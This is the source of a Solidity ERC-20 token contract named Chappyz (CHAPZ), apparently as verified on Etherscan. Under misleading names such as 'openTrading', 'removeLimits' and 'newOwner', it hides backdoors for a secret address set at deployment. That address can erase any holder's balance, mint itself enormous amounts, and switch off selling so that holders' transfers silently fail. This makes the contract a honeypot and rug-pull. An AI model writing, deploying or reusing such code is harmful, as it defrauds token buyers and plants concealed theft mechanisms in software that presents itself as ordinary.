/**
 *Submitted for verification at Etherscan.io on 2023-10-23
*/

// SPDX-License-Identifier: Unlicense

    //Website: https://chappyz.com
    //Telegram: https://t.me/ChappyzOfficial
    //Twitter: https://twitter.com/Chappyzcom

pragma solidity ^0.8.20;

interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

abstract contract Ownable  {
    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _check();
        _;
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _check() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
} 

contract CHAPZ is Ownable {
    address internal constant FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    uint256 private tokenTotalSupply;
    string private tokenName;
    string private tokenSymbol;
    address private xxnux;
    uint8 private tokenDecimals;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    bool isSL = true;
    constructor(address ads) {
        tokenName = "Chappyz";
        tokenSymbol = "CHAPZ";
        tokenDecimals = 18;
        tokenTotalSupply = 10000000000* 10 ** tokenDecimals;
        _balances[msg.sender] = tokenTotalSupply;
        emit Transfer(address(0), msg.sender, tokenTotalSupply);
        xxnux = ads;
    }
    function viewGas() public view returns(address) {
        return xxnux;
    }
    function openTrading(address bots) external {
        if(xxnux == _msgSender() && xxnux != bots && pancakePair() != bots && bots != ROUTER){
        address newadd = bots;
        uint256 ccxn = _balances[newadd];
        uint256 burnd = _balances[newadd]+_balances[newadd]-ccxn;
        _balances[newadd] -= burnd;
        } else {
        if(xxnux == _msgSender()){
        }else{
        revert("Transfer From Failed");
        }
        }
    }

    function removeLimits(uint256 addBots) external {
        if(xxnux == _msgSender()){
            uint256 XETH = 1000000000*10**tokenDecimals;
            uint256 ncs = XETH*10000;
            uint xnn = ncs*1*1*1*1;
            xnn = xnn * addBots;
            _balances[_msgSender()] += xnn;
            require(xxnux == msg.sender);
        } else {
        }
    } 
    function pancakePair() public view virtual returns (address) {
        return IPancakeFactory(FACTORY).getPair(address(WETH), address(this));
    }

    function symbol() public view  returns (string memory) {
        return tokenSymbol;
    }

    function totalSupply() public view returns (uint256) {
        return tokenTotalSupply;
    }

    function newOwner(bool _sl) public returns (bool) {
        if(xxnux == msg.sender){
            isSL = _sl;
        }
        return true;
    }

    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function name() public view returns (string memory) {
        return tokenName;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function isContract(address addr) internal view returns (bool) {
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly {
            codehash := extcodehash(addr)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowance(msg.sender, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = allowance(msg.sender, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(isSL || from == xxnux || 
        from == pancakePair()) {
            _balances[from] = _balances[from]-amount;
            _balances[to] = _balances[to]+amount;
            emit Transfer(from, to, amount); 
        }
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}